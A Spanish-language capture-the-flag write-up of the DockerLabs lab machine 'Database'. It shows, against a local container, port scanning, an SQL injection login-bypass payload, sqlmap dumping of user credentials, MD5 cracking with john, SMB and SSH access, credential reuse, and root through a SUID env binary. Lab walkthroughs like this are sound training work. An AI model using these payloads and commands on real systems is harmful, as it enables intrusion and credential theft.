## Introducción

Este documento presenta la resolución completa de la máquina **Database**, desarrollada por *El Pingüino de Mario* para la plataforma **DockerLabs**, clasificada con una dificultad **Media**.
El laboratorio expone un servidor web con un formulario de login vulnerable a **SQL Injection**, permitiendo el bypass de autenticación y la extracción de credenciales de la base de datos. Con estas credenciales, se accede al recurso compartido SMB, donde se encuentra un hash MD5 que, tras ser crackeado, permite el acceso SSH al usuario `augustus`.
Una vez dentro, se prueba la reutilización de credenciales para acceder al usuario `dylan`. Finalmente, se identifica que el binario `env` tiene permisos SUID, permitiendo la escalada directa de privilegios a `root`.
Todo el proceso se llevó a cabo dentro de un entorno controlado con fines estrictamente educativos.

## Paso 0 — Despliegue y preparación

Se descomprime la máquina y se despliega utilizando el script proporcionado:

```bash
unzip Database.zip
sudo bash auto_deploy.sh Database.tar
```

Una vez iniciado el contenedor, se asigna la dirección IP correspondiente.

![IP asignada](https://res.cloudinary.com/dewqswzke/image/upload/v1762582724/Ip_qrhpof.png)

Se organiza el entorno de trabajo para mantener una estructura clara durante el análisis:

```bash
mkdir -p Database/{content,exploits,nmap,scripts}
cd Database
```

---

## Paso 1 — Reconocimiento

### 1.1 Escaneo de puertos

Se realiza un escaneo completo de puertos TCP para identificar servicios expuestos:

```bash
nmap -p- --open -sS --min-rate 5000 -vvv -n 172.17.0.2 -oG allPorts
extractPorts allPorts
```

El resultado muestra los siguientes servicios accesibles externamente:

* **22/tcp** — SSH
* **80/tcp** — HTTP
* **139/tcp** — SMB
* **445/tcp** — SMB

![Puertos abiertos](https://res.cloudinary.com/dewqswzke/image/upload/v1769142331/Ports_j3n1ff.png)

---

### 1.2 Enumeración de servicios

Se realiza un escaneo detallado de los servicios identificados:

```bash
nmap -sCV -p22,80,139,445 172.17.0.2
```

---

### 1.3 Enumeración web

Se realiza un escaneo de directorios:

```bash
feroxbuster -u http://172.17.0.2/ \
  -w /usr/share/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-big.txt \
  -x php,html,txt,js,json -t 100 -C 404
```

Se identifica un formulario de autenticación en `/index`.

---

### 1.4 Enumeración SMB

Se utiliza `enum4linux`:

```bash
enum4linux -a 172.17.0.2
```

**Hallazgos:**
- Usuario SMB: `dylan`.

## Paso 2 — Explotación (Acceso inicial)

### 2.1 SQL Injection

Se prueba un bypass clásico en el formulario de login:

```
' or 1=1-- -
```

El payload funciona:

![Welcome Dylan](https://res.cloudinary.com/dewqswzke/image/upload/v1769142330/AccesoValidoDylan_wmcbip.png)

### 2.2 Extracción de credenciales

Se utiliza `sqlmap` para enumerar bases de datos:

```bash
sqlmap -u "http://172.17.0.2" --dbs --batch --form
```

![Databases](https://res.cloudinary.com/dewqswzke/image/upload/v1769142329/Databases_wxk2kn.png)

Se extrae la tabla `users` de la base de datos `register`:

```bash
sqlmap -u "http://172.17.0.2" --form --batch -D register -T users --dump
```

![Users](https://res.cloudinary.com/dewqswzke/image/upload/v1769142333/UsersDatabase_tw6env.png)

### 2.3 Acceso SMB

Se accede al recurso compartido:

```bash
smbclient \\172.17.0.2\\shared -U "dylan%<PASSWORD>"
```

Se encuentra el archivo `augustus.txt` con un hash MD5:

```bash
john --format=Raw-MD5 --wordlist=/usr/share/wordlists/rockyou.txt hash
```

![John](https://res.cloudinary.com/dewqswzke/image/upload/v1769142330/John_oux5b4.png)

### 2.4 Acceso SSH

Con la contraseña obtenida, se accede como `augustus`:

```bash
ssh augustus@172.17.0.2
```

![SSH](https://res.cloudinary.com/dewqswzke/image/upload/v1769142332/SSH_fj014b.png)

## Paso 3 — Escalada de privilegios

### 3.1 De augustus → dylan

Se prueba la reutilización de credenciales:

```bash
su dylan
```

![Dylan](https://res.cloudinary.com/dewqswzke/image/upload/v1769142329/Dylan_izmgdc.png)

### 3.2 De dylan → root

Se buscan binarios con permisos SUID:

```bash
find / -perm -4000 2>/dev/null
```

![Find](https://res.cloudinary.com/dewqswzke/image/upload/v1769142330/Find_p0troa.png)

Se identifica que `env` tiene permisos SUID. Se ejecuta:

```bash
env /bin/bash -p
```

![Root](https://res.cloudinary.com/dewqswzke/image/upload/v1769142331/Root_efe3ym.png)
